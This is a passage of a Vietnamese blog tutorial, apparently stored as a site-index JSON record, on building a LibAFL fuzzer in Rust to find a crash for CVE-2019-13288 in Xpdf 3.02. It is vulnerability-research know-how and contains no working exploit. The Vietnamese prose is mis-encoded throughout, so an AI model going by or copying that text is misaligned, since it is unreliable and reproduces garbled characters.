[{"content":"","date":"27 November 2023","externalUrl":null,"permalink":"/tags/libafl/","section":"Tags","summary":"","title":"Libafl"},{"content":" tags: libafl # Background # ƒê√¢y l√† l·∫ßn ƒë·∫ßu ti√™n m√¨nh ti·∫øp c·∫≠n v·ªõi m·∫£ng fuzzing, tr∆∞·ªõc ƒë√¢y th√¨ m√¨nh hay reverse audit chay ƒë·ªÉ t√¨m bug, nh∆∞ng sau khi m√¨nh ch∆°i pwn2own l√†m v·ªõi target source base l·ªõn th√¨ m√¨nh nh·∫≠n ra audit chay kh√° l√† \u0026ldquo;th·ªçt\u0026rdquo; so v·ªõi c√°c ƒë·ªôi kh√°c v√† m√¨nh quy·∫øt ƒë·ªãnh s·∫Ω th·ª≠ s·ª©c v·ªõi fuzzing.\nM√¨nh c√≥ h·ªèi s·∫øp m√¨nh v√† s·∫øp m√¨nh g·ª£i √Ω cho m√¨nh h·ªçc LibAFL. V·ªÅ LibAFL th√¨ v√†o th√°ng 8 nƒÉm 2021, Antonio Morales ƒë√£ t·∫°o m·ªôt c√°i repo Fuzzing 101 v·ªõi m·ª•c ƒë√≠ch l√† t·∫°o ra c√°c challenge li√™n quan ƒë·∫øn nh·ªØng ki·∫øn th·ª©c v√† basic skill c·ªßa fuzzing d√†nh cho nh·ªØng ai mu·ªën h·ªçc n√≥ v√† s·ª≠ d·ª•ng n√≥ ƒë·ªÉ t√¨m ra c√°c vulnerabilities. Repo n√†y t·∫≠p trung v√†o c√°ch s·ª≠ d·ª•ng c·ªßa AFL++ nh∆∞ng trong series m√¨nh vi·∫øt v·ªõi m·ª•c ƒë√≠ch l√† solve nh·ªØng challenge s·ª≠ d·ª•ng LibAFL thay v√¨ l√† AFL++.\nTrong series n√†y th√¨ m√¨nh s·∫Ω t√¨m hi·ªÉu c√°c th∆∞ vi·ªán v√† vi·∫øt fuzzers b·∫±ng ng√¥n ng·ªØ Rust, m√¨nh s·∫Ω c·ªë g·∫Øng solve c√°c challenges g·∫ßn gi·ªëng v·ªõi solution nh·∫•t m√† m√¨nh c√≥ th·ªÉ l√†m ƒë∆∞·ª£c.\nV√† trong series n√†y m√¨nh s·∫Ω s·ª≠ d·ª•ng ng√¥n ng·ªØ Rust ƒë·ªÉ vi·∫øt fuzzers. N·∫øu nh∆∞ b·∫°n ch∆∞a bi·∫øt Rust v√† Fuzzers l√† g√¨ th√¨ m√¨nh khuy·∫øn kh√≠ch b·∫°n n√™n t√¨m hi·ªÉu v·ªÅ n√≥ tr∆∞·ªõc khi ƒë·ªçc nh·ªØng g√¨ ti·∫øp theo.\nRust: Rust Book Fuzzing: What is fuzzing\nAbout LibAFL # LibAFL l√† m·ªôt s·ª± c·∫£i ti·∫øn t·ª´ AFL++ ƒë∆∞·ª£c vi·∫øt b·∫±ng ng√¥n ng·ªØ Rust. N√≥ nhanh h∆°n, ƒëa d·∫°ng n·ªÅn t·∫£ng, no_std compatibles v√† n√≥ t·∫≠n d·ª•ng t·ªët ngu·ªìn t√†i nguy√™n c·ªßa m√°y.\nƒê·ªÉ hi·ªÉu r√µ h∆°n v·ªÅ LibAFL b·∫°n c√≥ th·ªÉ coi c√°i n√†y Fuzzers Like Lego @rC3\nObjective # M·ª•c ƒë√≠ch c·ªßa fuzzers ch√∫ng ta l·∫ßn n√†y ƒë√≥ l√† g√¢y ra crash v√† t·∫°o PoC cho CVE-2019-13288 trong XPDF 3.02.\nIn Xpdf 4.01.01, the Parser::getObj() function in Parser.cc may cause infinite recursion via a crafted file. A remote attacker can leverage this for a DoS attack. This is similar to CVE-2018-16646.\nD·ª±a v√†o m√¥ t·∫£ c·ªßa l·ªó h·ªïng th√¨ n√¥m na n√≥ ch·ª©a 1 bug c√≥ th·ªÉ g√¢y ra infinite recursion th√¥ng qua file pdf. V·∫≠y PoC ta c·∫ßn ƒë√≥ l√† t·∫°o ra 1 file pdf c√≥ th·ªÉ g√¢y ra crash.\nPrequesite # Rust installation: # curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\nAFL++ installation: # Dependencies: sudo apt-get update sudo apt-get install -y python3-pip cmake build-essential git gcc sudo apt-get install -y build-essential python3-dev automake cmake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools cargo libgtk-3-dev # try to install llvm 14 and install the distro default if that fails sudo apt-get install -y lld-14 llvm-14 llvm-14-dev clang-14 || sudo apt-get install -y lld llvm llvm-dev clang sudo apt-get install -y gcc-$(gcc --version|head -n1|sed \u0026#39;s/\\..*//\u0026#39;|sed \u0026#39;s/.* //\u0026#39;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed \u0026#39;s/\\..*//\u0026#39;|sed \u0026#39;s/.* //\u0026#39;)-dev sudo apt-get install -y ninja-build # for QEMU mode Build AFL++: git clone https://github.com/AFLplusplus/AFLplusplus \u0026amp;\u0026amp; cd AFLplusplus export LLVM_CONFIG=\u0026#34;llvm-config-15\u0026#34; make distrib sudo make install N·∫øu nh∆∞ b·∫°n g·∫∑p l·ªói v·ªõi unicornafl th√¨ h√£y th·ª≠ downgrade version c·ªßa python xu·ªëng 3.10.8.\ncurl https://pyenv.run | bash pyenv install 3.10.8 pyenv global 3.10.8 Test installation: cd ~ export PATH=$PATH :~/AFLplusplus afl-fuzz -h Result:\ngh0st@pl4y-Gr0und:~$ afl-fuzz -h afl-fuzz++4.09a based on afl by Michal Zalewski and a large online community afl-fuzz [ options ] -- /path/to/fuzzed_app [ ... ] Required parameters: -i dir - input directory with test cases (or \u0026#39;-\u0026#39; to resume, also see AFL_AUTORESUME) -o dir - output directory for fuzzer findings Execution control settings: -P strategy - set fix mutation strategy: explore (focus on new coverage), exploit (focus on triggering crashes). You can also set a number of seconds after without any finds it switches to exploit mode, and back on new coverage (default: 1000) -p schedule - power schedules compute a seed\u0026#39;s performance score: fast(default), explore, exploit, seek, rare, mmopt, coe, lin quad -- see docs/FAQ.md for more information -f file - location read by the fuzzed program (default: stdin or @@) -t msec - timeout for each run (auto-scaled, default 1000 ms). Add a \u0026#39;+\u0026#39; to auto-calculate the timeout, the value being the maximum. -m megs - memory limit for child process (0 MB, 0 = no limit [default]) -O - use binary-only instrumentation (FRIDA mode) -Q - use binary-only instrumentation (QEMU mode) -U - use unicorn-based instrumentation (Unicorn mode) -W - use qemu-based instrumentation with Wine (Wine mode) -X - use VM fuzzing (NYX mode - standalone mode) -Y - use VM fuzzing (NYX mode - multiple instances mode) Mutator settings: -a - target input format, \u0026#34;text\u0026#34; or \u0026#34;binary\u0026#34; (default: generic) -g minlength - set min length of generated fuzz input (default: 1) -G maxlength - set max length of generated fuzz input (default: 1048576) -D - enable deterministic fuzzing (once per queue entry) -L minutes - use MOpt(imize) mode and set the time limit for entering the pacemaker mode (minutes of no new finds). 0 = immediately, -1 = immediately and together with normal mutation. Note: this option is usually not very effective -c program - enable CmpLog by specifying a binary compiled for it. if using QEMU/FRIDA or the fuzzing target is compiled for CmpLog then use \u0026#39;-c 0\u0026#39;. To disable Cmplog use \u0026#39;-c -\u0026#39;. -l cmplog_opts - CmpLog configuration values (e.g. \u0026#34;2ATR\u0026#34;): 1=small files, 2=larger files (default), 3=all files, A=arithmetic solving, T=transformational solving, X=extreme transform solving, R=random colorization bytes. Fuzzing behavior settings: -Z - sequential queue selection instead of weighted random -N - do not unlink the fuzzing input file (for devices etc.) -n - fuzz without instrumentation (non-instrumented mode) -x dict_file - fuzzer dictionary (see README.md, specify up to 4 times) Test settings: -s seed - use a fixed seed for the RNG -V seconds - fuzz for a specified time then terminate -E execs - fuzz for an approx. no. of total executions then terminate Note: not precise and can have several more executions. Other stuff: -M/-S id - distributed mode (-M sets -Z and disables trimming) see docs/fuzzing_in_depth.md#c-using-multiple-cores for effective recommendations for parallel fuzzing. -F path - sync to a foreign fuzzer queue directory (requires -M, can be specified up to 32 times) -T text - text banner to show on the screen -I command - execute this command/script when a new crash is found -C - crash exploration mode (the peruvian rabbit thing) -b cpu_id - bind the fuzzing process to the specified CPU core (0-...) -e ext - file extension for the fuzz test input file (if needed) To view also the supported environment variables of afl-fuzz please use \u0026#34;-hh\u0026#34;. Compiled with Python 3.11.4 module support, see docs/custom_mutators.md Compiled without AFL_PERSISTENT_RECORD support. Compiled with shmat support. For additional help please consult docs/README.md :) Setup our target # cd ~ mkdir fuzzing-101 cd fuzzing-101 cargo init fuzzing-101 s·∫Ω l√† directory root c√°i m√† l∆∞u tr·ªØ c√°c challenge trong project c·ªßa ch√∫ng ta.\nTrong directory n√†y ch√∫ng ta s·∫Ω ch·ªânh file Cargo.toml sao cho workspace n·∫±m ·ªü trong directory n√†y.\nfuzzing-101/Cargo.toml [workspace] members = [ \u0026#34;exercise-1\u0026#34;, ] [profile.release] lto = true codegen-units = 1 opt-level = 3 debug = true lto = true: S·ª≠ d·ª•ng Link-Time Optimization (t·ªëi ∆∞u h√≥a th·ªùi gian li√™n k·∫øt). ƒêi·ªÅu n√†y c√≥ th·ªÉ c·∫£i thi·ªán hi·ªáu su·∫•t b·∫±ng c√°ch t·ªëi ∆∞u h√≥a to√†n b·ªô ch∆∞∆°ng tr√¨nh t·∫°i th·ªùi ƒëi·ªÉm li√™n k·∫øt. codegen-units = 1: ƒê·∫∑t s·ªë l∆∞·ª£ng ƒë∆°n v·ªã m√£ h√≥a ƒë·ªÉ bi√™n d·ªãch ch∆∞∆°ng tr√¨nh. Trong tr∆∞·ªùng h·ª£p n√†y, ch·ªâ c√≥ m·ªôt ƒë∆°n v·ªã. opt-level = 3: ƒê·∫∑t c·∫•p ƒë·ªô t·ªëi ∆∞u h√≥a l√† 3. C·∫•p ƒë·ªô t·ªëi ∆∞u h√≥a cao nh·∫•t, th∆∞·ªùng d√†nh cho release ƒë·ªÉ t·ªëi ∆∞u h√≥a hi·ªáu su·∫•t. debug = true: B·∫≠t debug information trong phi√™n b·∫£n release. Sau khi xong th√¨ ch√∫ng ta t·∫°o solution project cho challenge 1.\ncargo new exercise-1\nInstall Xpdf # Download Xpdf 3.02 # cd fuzzing-101/exercise-1 wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz tar -xvf xpdf-3.02.tar.gz rm xpdf-3.02.tar.gz mv xpdf-3.02 xpdf Sau khi th·ª±c hi·ªán c√°c b∆∞·ªõc tr√™n th√¨ b·∫°n s·∫Ω c√≥ source c·ªßa Xpdf 3.02 n·∫±m trong directory xpdf\nFuzzing setup # Cargo.toml # exercise-1/cargo.toml\n[package] name = \u0026#34;exercise-one-solution\u0026#34; version = \u0026#34;0.1.0\u0026#34; edition = \u0026#34;2021\u0026#34; [dependencies] libafl = { version = \u0026#34;0.10.1\u0026#34; } Makefile.toml # exercise-1/Makefile.toml\nC√≥ m·ªôt tool kh√° l√† hay m√¨nh t√¨m ƒë∆∞·ª£c ƒë√≥ l√† Cargo make. Thay v√¨ ch√∫ng ta s·ª≠ d·ª•ng build nh∆∞ th√¥ng th∆∞·ªùng (d√πng file build.rs ho·∫∑c l√† d√πng commandline) th√¨ ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng cargo make ƒë·ªÉ c√≥ th·ªÉ build project m·ªôt c√°ch t·ª± ƒë·ªông.\nInstallation:\ncargo install --force cargo-make V√≠ d·ª• ƒë·ªÉ build xpdf v·ªõi commandline:\ncd fuzzing-101-solutions/exercise-1/xpdf make clean rm -rf install export LLVM_CONFIG=llvm-config-15 CC=afl-clang-fast CXX=afl-clang-fast++ ./configure --prefix=./install make make install Th√¨ chuy·ªÉn sang file Makefile.toml n√≥ s·∫Ω nh∆∞ th·∫ø n√†y\n# composite tasks [tasks.clean] dependencies = [\u0026#34;cargo-clean\u0026#34;, \u0026#34;afl-clean\u0026#34;, \u0026#34;clean-xpdf\u0026#34;] [tasks.cargo-clean] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;clean\u0026#34;] [tasks.afl-clean] script = \u0026#39;\u0026#39;\u0026#39; rm -rf .cur_input* timeouts \u0026#39;\u0026#39;\u0026#39; [tasks.clean-xpdf] cwd = \u0026#34;xpdf\u0026#34; script = \u0026#34;\u0026#34;\u0026#34; make --silent clean rm -rf built-with-* ../build/* ${CARGO_MAKE_WORKING_DIRECTORY}/xpdf/install \u0026#34;\u0026#34;\u0026#34; [tasks.build] dependencies = [\u0026#34;afl-clean\u0026#34;, \u0026#34;clean-xpdf\u0026#34;, \u0026#34;build-xpdf\u0026#34;, \u0026#34;build-fuzzer\u0026#34;] [tasks.build-xpdf] cwd = \u0026#34;xpdf\u0026#34; script = \u0026#34;\u0026#34;\u0026#34; export LLVM_CONFIG=llvm-config-15 CC=afl-clang-fast CXX=afl-clang-fast++ ./configure --prefix=${CARGO_MAKE_WORKING_DIRECTORY}/xpdf/install make make install \u0026#34;\u0026#34;\u0026#34; [tasks.build-fuzzer] script = \u0026#34;\u0026#34;\u0026#34; cargo build --release \u0026#34;\u0026#34;\u0026#34; V√† vi·ªác c√≤n l·∫°i c·ªßa ch√∫ng ta ch·ªâ c·∫ßn l√†m l√†\ncargo make build\nN√≥ s·∫Ω ch·∫°y c√°c t√°c v·ª• b√™n trong n√≥ bao g·ªìm afl-clean, clean-xpdf, build-xpdf v√† build-fuzzer\n[tasks.build] dependencies = [\u0026#34;afl-clean\u0026#34;, \u0026#34;clean-xpdf\u0026#34;, \u0026#34;build-xpdf\u0026#34;, \u0026#34;build-fuzzer\u0026#34;] Sau khi ch·∫°y th√†nh c√¥ng th√¨ ch√∫ng ta s·∫Ω c√≥ ƒë∆∞·ª£c c√°c binary file c·ªßa xpdf\nCorpus # Corpus l√† n∆°i m√† c√°c testcases c·ªßa ch√∫ng ta ƒë∆∞·ª£c l∆∞u t·∫°i ƒë√≥. Ch√∫ng ta xem c√°c testcase l√† input c·ªßa ch√∫ng ta, m·ªôt corpus c√≥ th·ªÉ l∆∞u tr·ªØ c√°c testcases ·ªü nhi·ªÅu d·∫°ng, c√≥ th·ªÉ l∆∞u tr·ª±c ti·∫øp tr√™n th∆∞ m·ª•c th√†nh file, memory,\u0026hellip;. Trong exercise-1 th√¨ corpus s·∫Ω l∆∞u tr·ªØ c√°c file pdf ƒë·ªÉ c√≥ th·ªÉ th·ª±c thi c√°c file binary c·ªßa xpdf.\ninstall corpus:\ncd fuzzing-101-solutions/exercise-1 mkdir corpus cd corpus wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf wget http://www.africau.edu/images/default/sample.pdf wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf Ch√∫ng ta ch·ªâ c·∫ßn m·ªôt v√†i sample ƒë·ªÉ l√†m input cho fuzzer.\nFuzz Everything # M·ªçi th·ª© ƒë√£ setup ok, ch√∫ng ta ƒëi v√†o ph·∫ßn cu·ªëi, ƒë√≥ l√† vi·∫øt file fuzz ƒë·ªÉ t√¨m ra PoC g√¢y crash.\nFile main.rs s·∫Ω ch·ªãu tr√°ch nhi·ªám cho vi·ªác fuzzing, ch√∫ng ta s·∫Ω s·ª≠ d·ª•ng c√°c component kh√°c nhau ƒë·ªÉ ti·∫øn h√†nh fuzz. Trong file main.rs m√¨nh s·ª≠ d·ª•ng concept c·ªßa forkserver_simple.\nD·ª±a v√†o concept tr√™n th√¨ component c·ªßa m√¨nh s·∫Ω bao g·ªìm: Corpus \u0026amp; Input, Observer, Feedback, Objective, State, Monitor, EventManager, Scheduler, Fuzzer, Executor, Mutator, Stage.\nTrong main.rs m√¨nh s·∫Ω c·ªë g·∫Øng gi·∫£i th√≠ch r√µ c√°c components m√† m√¨nh s·ª≠ d·ª•ng v√† c√°ch n√≥ li√™n k·∫øt v·ªõi √Ω t∆∞·ªüng c·ªßa fuzzing c·ªßa m√¨nh.\n1st Component: Corpus \u0026amp; Input # Tr∆∞·ªõc khi b·∫Øt ƒë·∫ßu cho t·∫•t c·∫£ m·ªçi th·ª© ch√∫ng ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh input v√† output cho fuzzing. Input ·ªü ƒë√¢y ƒë√≥ ch√≠nh l√† c√°c file sample pdf trong exercise-1/corpus. ƒê·ªÉ l·∫•y c√°c sample trong corpus th√¨ m√¨nh s·ª≠ d·ª•ng InMemoryCorpus ƒë·ªÉ tr√°nh vi·ªác reads or writes v√†o trong directory, vi·ªác n√†y s·∫Ω c·∫£i thi·ªán t·ªëc ƒë·ªô fuzzing b·∫±ng c√°ch ngƒÉn ch·∫∑n n√≥ ti·∫øp c·∫≠n v√†o directory corpus.\nlet corpus_directory = vec![PathBuf::from(\u0026#34;./corpus\u0026#34;)]; Ti·∫øp theo, ch√∫ng ta kh√¥ng th·ªÉ truy·ªÅn file pdf m·ªôt c√°ch tr·ª±c ti·∫øp ƒë∆∞·ª£c m√† ph·∫£i c·∫ßn chuy·ªÉn n√≥ th√†nh d·∫°ng d·ªØ li·ªáu ph√π h·ª£p cho fuzzer. ·ªû ƒë√¢y m√¨nh s·∫Ω d√πng BytesInput ƒë·ªÉ fuzzer c√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c input v√† x·ª≠ l√Ω n√≥.\nlet corpus_BytesInput = InMemoryCorpus::\u0026lt;BytesInput\u0026gt;::new(); Output cho fuzzing hay g·ªçi c√°ch kh√°c ƒë√≥ ch√≠nh l√† \u0026ldquo;solutions\u0026rdquo;, n√≥ ch√≠nh l√† file pdf s·∫Ω g√¢y ra crash cho ch∆∞∆°ng tr√¨nh, hay n√≥i c√°ch kh√°c n·ªØa n√≥ ch√≠nh l√† PoC khi·∫øn cho ch∆∞∆°ng tr√¨nh r∆°i v√†o infinite recursion. M√¨nh s·∫Ω s·ª≠ d·ª•ng OnDiskCorpus ƒë·ªÉ l∆∞u c√°i PoC ƒë√≥ v√¥ trong corpus.\nlet crash_corpus = OnDiskCorpus::new(PathBuf::from(\u0026#34;./crash\u0026#34;)); V·∫≠y l√† ch√∫ng ta ƒë√£ x√°c ƒë·ªãnh ƒë∆∞·ª£c input v√† output cho fuzzer.\n2nd Component: Observer # Theo trong libafl book th√¨ Observer l√† m·ªôt lo·∫°i component ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ cung c·∫•p c√°c th√¥ng tin trong qu√° tr√¨nh th·ª±c thi c·ªßa testcase hi·ªán t·∫°i ƒëang ƒë∆∞·ª£c fuzz. Trong concept c·ªßa forkserver_simple th√¨ m√¨nh s·∫Ω s·ª≠ d·ª•ng TimeObserver. Nh∆∞ m√¨nh ƒë√£ m√¥ t·∫£ v·ªÅ observer ·ªü tr√™n th√¨ TimeObserver n√≥ s·∫Ω l·∫•y d·ªØ li·ªáu v·ªÅ runtime cho testcase ƒëang ƒë∆∞·ª£c fuzz. M·ªói l·∫ßn fuzz th√¨ TimeObserver n√≥ s·∫Ω g·ª≠i gi√° tr·ªã v·ªÅ th·ªùi gian cho m·ªói l·∫ßn m√† testcase ƒë∆∞·ª£c th·ª±c thi th√¥ng qua Feedback component (t√≠ n·ªØa m√¨nh s·∫Ω n√≥i r√µ h∆°n v·ªÅ n√≥). V√≠ d·ª• m√¨nh c√≥ m·ªôt file pdf g·ªçi l√† x, v√† th·ªùi gian ƒë·ªÉ ch·∫°y file pdftotext x t·ªën 5 gi√¢y th√¨ TimeObserver s·∫Ω l·∫•y 5 gi√¢y ƒë√≥ th√¥ng qua Feedback component v√† g·ª≠i n√≥ cho fuzzer.\nlet timeObserver = TimeObserver::new(\u0026#34;time\u0026#34;); B√™n c·∫°nh TimeObserver th√¨ ch√∫ng ta c·∫ßn ph·∫£i c√≥ th√™m Coverage Map theo nh∆∞ trong concept c·ªßa forkserver_simple, Coverage Map s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ l√† coverage guided cho fuzzing, n√≥ s·∫Ω t·∫≠p trung v√†o t·ªëi ƒëa code coverage ƒë·ªÉ t√¨m ra l·ªó h·ªïng cho ch√∫ng ta. ƒê·ªÉ c√≥ th·ªÉ build Coverage Map th√¨ ch√∫ng ta c·∫ßn shared memory.\nƒê·∫ßu ti√™n th√¨ ch√∫ng ta c·∫ßn t·∫°o SharedMemProvider, n√≥ s·∫Ω cung c·∫•p quy·ªÅn truy c·∫≠p v√†o shared memory ƒë∆∞·ª£c mapping tr·ª±c ti·∫øp v√¥. Ch√∫ng ta s·ª≠ d·ª•ng unix shared memory trong AFL++.\nconst MAP_SIZE: usize = 65536; let mut shmem_provider = StdShMemProvider::new().unwrap(); let mut shmem = shmem_provider.new_shmem(MAP_SIZE).unwrap(); Coverage map s·∫Ω chia s·∫ª l·∫´n nhau gi·ªØa observer v√† executor. ƒê·ªÉ executor bi·∫øt ƒë∆∞·ª£c coverage map th√¨ m√¨nh s·∫Ω ghi shared memory id th√¨ m√¨nh s·∫Ω ghi n√≥ v√†o environment.\nshmem.write_to_env(\u0026#34;__AFL_SHM_ID\u0026#34;).unwrap(); Ti·∫øp theo ch√∫ng ta c·∫ßn ph·∫£i x·ª≠ l√Ω shared memory sao cho n√≥ c√≥ th·ªÉ thay ƒë·ªïi trong qu√° tr√¨nh fuzzing.\nlet shmem_buf = shmem.as_mut_slice(); V√† cu·ªëi c√πng m√¨nh s·∫Ω build Observer sau khi c√≥ ƒë∆∞·ª£c TimeObserver v√† ShareMemoryMap. V·ªõi Observer th√¨ m√¨nh ch·ªâ c·∫ßn ƒë∆∞a v√†o gi√° tr·ªã c·ªßa ShareMemoryMap v√† m√¨nh g·ªçi n√≥ l√† shared_mem (d·ª±a v√†o concept c·ªßa forkserver_simple).\nM√¨nh s·∫Ω s·ª≠ d·ª•ng HitCountsMapObserver. Theo nh∆∞ m√¥ t·∫£ trong libafl docs th√¨ HitCountsMapObserver c·∫ßn m·ªôt \u0026ldquo;base object\u0026rdquo; ƒë·ªÉ l√†m constructor, base object m√¨nh s·ª≠ d·ª•ng ƒë√≥ l√† MapObserver. Object n√†y s·∫Ω x√°c ƒë·ªãnh xem trong qu√° tr√¨nh fuzzing li·ªáu c√≥ testcase n√†o \u0026ldquo;suspicious\u0026rdquo; hay kh√¥ng.\nlet edges_observer = unsafe { HitcountsMapObserver::new(StdMapObserver::new(\u0026#34;shared_mem\u0026#34;, shmem_buf)) }; Ch√∫ng ta ƒë√£ ho√†n th√†nh Observer, ƒëi ƒë·∫øn ph·∫ßn ti·∫øp theo.\n3rd Component: Feedback # Feedback n√≥ gi·ªëng nh∆∞ l√† output c·ªßa Observer, n√≥ s·∫Ω x√°c ƒë·ªãnh xem th·ª≠ c√≥ outcome n√†o \u0026ldquo;suspicious\u0026rdquo; t·ª´ observer hay kh√¥ng, n·∫øu nh∆∞ testcase ƒë√≥ c√≥ v·∫ª nh∆∞ l√† kh√¥ng ·ªïn th√¨ c√°i input ƒë∆∞·ª£c s·ª≠ d·ª•ng cho l·∫ßn fuzzing ƒë√≥ s·∫Ω ƒë∆∞·ª£c ƒë∆∞a v√†o Corpus. M√¨nh s·∫Ω t·∫°o Feedback d·ª±a tr√™n TimeObserver v√† CoverageMapObserver.\nlet mut feedback = feedback_or!( MaxMapFeedback::tracking(\u0026amp;edges_observer, true, false), TimeFeedback::with_observer(\u0026amp;timeObserver) ); ƒêo·∫°n m√£ rust ·ªü tr√™n, ƒë·ªëi v·ªõi CoverageMapObserver th√¨ m√¨nh c√≥ s·ª≠ d·ª•ng MaxMapFeedback c√°i n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ x√°c ƒë·ªãnh output c·ªßa HitcountsMapObserver‚Äôs coverage map, n·∫øu nh∆∞ output c·ªßa HitcountsMapObserver l·ªõn h∆°n MAP_SIZE th√¨ ch·∫Øc ch·∫Øn input c·ªßa ch√∫ng ta c√≥ g√¨ ƒë√≥ khi·∫øn cho n√≥ nh∆∞ v·∫≠y. ƒê·ªëi v·ªõi TimeObserver th√¨ ƒë∆°n gi·∫£n m√¨nh s·ª≠ d·ª•ng TimeFeedback.\nV·ªõi hai Observer ·ªü tr√™n, ƒë·ªÉ k·∫øt h·ª£p c·∫£ hai l·∫°i m√¨nh s·ª≠ d·ª•ng logical OR, b·ªüi v√¨ m√¨nh ch·ªâ c·∫ßn m·ªôt trong hai c√°i ƒë√≥, n·∫øu nh∆∞ outputt c·ªßa HitcountsMapObserver l·ªõn h∆°n so v·ªõi entry c·ªßa n√≥ ho·∫∑c l√† TimeObserver l√¢u h∆°n so v·ªõi th√¥ng th∆∞·ªùng th√¨ c√≥ nghƒ©a l√† input c·ªßa ch√∫ng ta c√≥ th·ªÉ g√¢y l·ªói ch∆∞∆°ng tr√¨nh.\nSau khi ƒë√£ t√¨m ƒë∆∞·ª£c input c√≥ kh·∫£ nƒÉng g√¢y l·ªói cho ch∆∞∆°ng tr√¨nh th√¨ ch√∫ng ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh ch√≠nh x√°c xem input c√≥ th·ª±c s·ª± g√¢y crash cho file th·ª±c thi hay kh√¥ng. L·∫ßn n√†y thay v√¨ s·ª≠ d·ª•ng logical OR ƒë·ªÉ x√°c ƒë·ªãnh th√¨ m√¨nh s·∫Ω s·ª≠ d·ª•ng logical AND ƒë·ªÉ k·∫øt h·ª£p c·∫£ hai l·∫°i v·ªõi nhau, b·ªüi v√¨ m·ªôt input g√¢y crash cho ch∆∞∆°ng tr√¨nh th√¨ ch·∫Øc ch·∫Øn th·ªùi gian n√≥ s·∫Ω b·ªã timeout v√† input s·∫Ω khi·∫øn cho ch∆∞∆°ng tr√¨nh r·∫Ω sang m·ªôt h∆∞·ªõng code kh√°c trong coverage map.\nlet mut objective = feedback_and_fast!( // Must be a crash TimeoutFeedback::new(), // Take it only if trigger new coverage over crashes MaxMapFeedback::new(\u0026amp;edges_observer) Ch√∫ng ta di chuy·ªÉn t·ªõi component State\n4th Component: State # V·ªõi component l·∫ßn n√†y th√¨ m√¨nh s·∫Ω s·ª≠ d·ª•ng StdState. StdState s·∫Ω x√°c ƒë·ªãnh state cho fuzzer, random number generator, corpora.\nlet mut state = StdState::new( StdRand::with_seed(current_nanos()), // Corpus that will be evolved, we keep it in memory for performance corpus_BytesInput, // Corpus in which we store solutions (crashes in this example), // on disk so the user can get them after stopping the fuzzer crash_corpus, // States of the feedbacks. // The feedbacks can report the data that should persist in the State. \u0026amp;mut feedback, // Same for objective feedbacks \u0026amp;mut objective, ) .unwrap(); 5th Component: Monitor # Monitor s·∫Ω theo d√µi to√†n b·ªô th√¥ng tin v√† ƒë∆∞a ra c√°ch ph√π h·ª£p nh·∫•t ƒë·ªÉ c√≥ th·ªÉ hi·ªÉn th·ªã c√°c th√¥ng tin ƒë√≥ cho ch√∫ng ta.\nM√¨nh s·∫Ω s·ª≠ d·ª•ng SimpleMonitor, n√≥ gi·ªëng nh∆∞ printf trong C. N√≥ s·∫Ω in ra c√°c th√¥ng tin cho ch√∫ng ta tr√™n terminal.\nlet monitor = SimpleMonitor::new(|s| println!(\u0026#34;{s}\u0026#34;)); 6th Component: EventManager # Component n√†y t∆∞∆°ng t·ª± v·ªõi Monitor, n√≥ s·∫Ω x·ª≠ l√Ω c√°c Events trong qu√° tr√¨nh fuzzing, v√≠ d·ª• nh∆∞ l√† updating Monitor Component, logging v√† t√¨m c√°c testcase kh·∫£ nghi.\nSimplest Methods as always\nlet mut mgr = SimpleEventManager::new(monitor); 7th Component: Scheduler # Trong qu√° tr√¨nh fuzzing ch√∫ng ta c·∫ßn ph·∫£i ƒë∆∞a v√†o c√°c testcases kh√°c nhau t·ª´ corpus th√¨ Scheduler s·∫Ω ƒë·∫£m nh·∫≠n vai tr√≤ n√†y. N√≥ s·∫Ω t·∫°o ra c√°c testcase m·ªõi ph√π h·ª£p cho strategy c·ªßa fuzzer t·ª´ corpus. ƒê·ªÉ ∆∞u ti√™n c√°c testcase \u0026ldquo;nh·ªè, g·ªçn\u0026rdquo; ƒë·ªÉ t·ªëi ∆∞u th·ªùi gian fuzzing th√¨ m√¨nh s·ª≠ d·ª•ng strategy IndexesLenTimeMinimizerScheduler gi·ªëng nh∆∞ trong concept c·ªßa forkserver_simple.\nlet scheduler = IndexesLenTimeMinimizerScheduler::new(QueueScheduler::new()); 8th Component: Fuzzer # ƒê·ªëi v·ªõi component n√†y m√¨nh ch·ªçn TimeoutForkserverExecutor. \u0026ldquo;Timeout forkserver\u0026rdquo; bao b·ªçc quanh tr√¨nh th·ª±c thi standard ForkserverExecutor v√† thi·∫øt l·∫≠p m·ªôt th·ªùi gian ch·ªù tr∆∞·ªõc m·ªói l·∫ßn ch·∫°y. C√≥ nghƒ©a tr∆∞·ªõc khi ch·∫°y th√¨ n√≥ s·∫Ω set timeout ƒë·ªÉ c√≥ th·ªÉ fork m·ªôt process kh√°c ƒë·ªÉ fuzz.\nCh√∫ng ta c·∫ßn ph·∫£i ch·ªâ ra nh·ªØng g√¨ m√† ch√∫ng ta mu·ªën th·ª±c thi cho Executor. ·ªû ƒë√¢y ƒë√≥ l√†\nexercise-1/xpdf/xpdf/install/bin/pdftotext PDF-FILE let mut fuzzer = StdFuzzer::new(scheduler, feedback, objective); let mut forkserver = ForkserverExecutor::builder() .program(\u0026#34;./xpdf/xpdf/install/bin/pdftotext\u0026#34;) .parse_afl_cmdline([\u0026#34;@@\u0026#34;]) //L√≠ do c√≥ @@ ·ªü ƒë√¢y ƒë√≥ ch√≠nh l√† ch·ªâ ƒë·ªãnh cho ForkserverExecutor r·∫±ng ch√∫ng ta s·ª≠ d·ª•ng BytesInput .coverage_map_size(MAP_SIZE) .build(tuple_list!(timeObserver, edges_observer)) .unwrap(); let timeout = Duration::from_secs(5); //Ch√∫ng ta set timeout 5 gi√¢y let mut executor = TimeoutForkserverExecutor::new(forkserver, timeout).unwrap(); V√† ch√∫ng ta ƒëi t·ªõi component cu·ªëi c√πng: Mutator + Stage\n9th Component: Mutator + Stage # Mutator nh∆∞ trong docs 